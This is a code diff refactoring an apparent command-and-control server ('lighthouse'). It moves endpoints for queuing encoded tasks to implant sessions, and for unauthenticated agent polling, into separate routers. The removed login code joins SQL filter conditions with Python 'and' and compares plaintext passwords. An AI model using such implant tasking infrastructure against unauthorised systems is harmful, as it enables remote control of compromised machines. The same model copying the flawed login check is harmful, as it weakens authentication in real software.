@@ -45,126 +45,17 @@ from routes.user_routes import router as user_router
 from routes.health_routes import router as health_router
 from routes.results_routes import router as results_router
 from routes.implant_routes import router as implant_router
+from routes.task_routes import router as task_router
+from routes.tasking_routes import router as tasking_router
+from routes.token_routes import router as token_router
 
 app.include_router(user_router)
 app.include_router(health_router)
 app.include_router(results_router)
 app.include_router(implant_router)
-
-
-# for client only to be able to access protected endpoints, authentication via OAuth2
-@app.post("/token/", response_model=Token)
-def login(
-    db: SessionLocal = Depends(get_db),  # type: ignore
-    form_data: OAuth2PasswordRequestForm = Depends(),
-):
-    user_exists = (
-        db.query(Users)
-        .filter(
-            Users.username == form_data.username
-            and Users.password == form_data.password
-        )
-        .first()
-    )
-    if not user_exists:
-        raise HTTPException(status_code=401, detail="Invalid username or password")
-    access_token = create_access_token(data={"sub": form_data.username})
-    return {"access_token": access_token, "token_type": "bearer"}
-
-
-# PROTECTED endpoint in order to create a task for an implant (client -> server)
-@app.post("/tasking/{session}", response_model=TaskingCreate)
-def create_tasking(
-    session: str,
-    tasking: TaskingCreate,
-    db: SessionLocal = Depends(get_db),  # type: ignore
-    token: str = Security(oauth2_scheme),
-):
-    """
-    The endpoint where merchant will submit tasking requests to lighthouse for the agent to pick up and action
-    :param session: The session id we should associate with for the tasking request
-    :param tasking: The json blob containing the valid tasking request
-    :param db: The active database connection
-    :param token: The token used to authenticate a merchant to lighthouse
-    :return db_task: The json tasking information, 404 if the session is not found, 400 if the
-    arguments are not valid for the tasking request
-    """
-    verify_token(token)
-    current_time = datetime.now(timezone.utc).isoformat()
-    # Check if the session exists
-    db_implant = db.query(Implant).filter(Implant.session == session).first()
-    if not db_implant:
-        raise HTTPException(status_code=404, detail="Session not found")
-
-    # Decode the arguments from base64(hex) if provided
-    if tasking.args:
-        try:
-            args_bytes = bytes.fromhex(tasking.args)
-            decoded_args = base64.b64decode(args_bytes.decode("utf-8")).decode("utf-8")
-        except (binascii.Error, UnicodeDecodeError, ValueError) as e:
-            raise HTTPException(status_code=400, detail=f"Invalid encoded args: {e}")
-    else:
-        decoded_args = ""
-    # Dump model data excluding fields that will be manually set
-    tasking_data = tasking.model_dump(exclude={"session", "complete", "date"})
-    # Override 'args' with decoded version
-    tasking_data["args"] = decoded_args
-    # Create new task
-    db_task = Tasking(
-        **tasking_data, session=session, date=current_time, complete="False"
-    )
-    db.add(db_task)
-    db.commit()
-    db.refresh(db_task)
-    return db_task
-
-
-# PROTECTED endpoint for client to retrieve taskings
-@app.get("/tasking/{session}", response_model=List[TaskingRead])
-def read_taskings(
-    session: str,
-    db: SessionLocal = Depends(get_db),  # type: ignore
-    token: str = Security(oauth2_scheme),
-):
-    verify_token(token)
-    db_implant = db.query(Implant).filter(Implant.session == session).first()
-    if not db_implant:
-        raise HTTPException(status_code=404, detail="Session not found")
-
-    tasking = (
-        db.query(Tasking)
-        .filter(
-            Tasking.session == session,
-            Tasking.complete.in_(["False", "Pending", "True"]),
-        )
-        .all()
-    )
-    return tasking
-
-
-# endpoint for agent to retrieve tasks, mark them as pending after agent picks them up
-@app.get("/tasks/{session}", response_model=List[TaskingRead])
-def get_tasks(session: str, db: SessionLocal = Depends(get_db)):  # type: ignore
-    db_implant = db.query(Implant).filter(Implant.session == session).first()
-    if db_implant is None:
-        raise HTTPException(status_code=404, detail="Session not found")
-
-    tasking = (
-        db.query(Tasking)
-        .filter(Tasking.session == session, Tasking.complete.in_(["False", "Pending"]))
-        .all()
-    )
-    if not tasking:
-        raise HTTPException(status_code=404, detail="No tasks found for this session")
-    # Mark tasks as pending
-    for task in tasking:
-        # implant picked it up for action
-        task.complete = "Pending"
-        db.commit()
-        db.refresh(task)
-
-    return tasking
-
+app.include_router(task_router)
+app.include_router(tasking_router)
+app.include_router(token_router)
 
 if __name__ == '__main__':
     opts = argparse.ArgumentParser(description="light_house server application")
